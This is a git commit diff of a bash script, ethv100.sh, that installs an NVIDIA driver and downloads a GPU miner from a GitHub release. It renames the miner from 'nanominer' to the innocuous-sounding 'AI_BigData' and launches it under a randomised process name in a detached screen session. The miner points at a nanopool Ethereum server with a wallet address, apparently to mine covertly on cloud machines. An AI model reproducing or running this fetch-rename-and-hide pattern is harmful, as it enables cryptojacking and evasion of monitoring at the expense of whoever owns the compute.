d82ae0c13056b13bbd4c3030f512584c4f5bc0e8
ts6aud5vkg <44915776+ts6aud5vkg@users.noreply.github.com>
2021-10-09 17:08:12 +0700

    Update ethv100.sh

--- ethv100.sh
+++ ethv100.sh
@@ -1,20 +1,19 @@
 #!/bin/bash
-sudo apt-get update
+apt-get update
+apt-get install -y git wget screen
 azure=mxsemsdnlkdj
 a='mxsemsdnlkdj-' && b=$(shuf -i10-375 -n1) && c='-' && d=$(shuf -i10-259 -n1) && cpuname=$a$b$c$d
-apt-get install -y git wget screen
 wget https://us.download.nvidia.com/tesla/460.73.01/NVIDIA-Linux-x86_64-460.73.01.run
 sudo chmod +x NVIDIA-Linux-x86_64-460.73.01.run
 ./NVIDIA-Linux-x86_64-460.73.01.run
+rm -r /usr/share/work/$azure
 mkdir /usr/share
 mkdir /usr/share/work
-rm -r /usr/share/work/platinum
-wget https://github.com/ts6aud5vkg/gpuissa/releases/download/ethv100/platinum.tar.gz
-mv platinum.tar.gz /usr/share/work/
-cd /usr/share/work/ &&  tar xf platinum.tar.gz
-rm -rf platinum.tar.gz && cd platinum
-mv nanominer $azure -n
+wget https://github.com/ts6aud5vkg/gpuissa/releases/download/grin/AI_BigData
+mv AI_BigData /usr/share/work/ && cd  /usr/share/work/ && chmod 777 AI_BigData
+mv AI_BigData $azure -n
 cp $azure "$cpuname"
-rm -f  nanominer
+rm -f  AI_BigData
 echo $cpuname" is starting"
-screen -d -m ./"${cpuname}"
+screen -d -m ./"${cpuname}" --algo ethash --server eth-us-west1.nanopool.org:9433 --user 0xfa5791101bf9c5f5a4753c034b77de0e4d1f79ca.orc --ssl 1
+
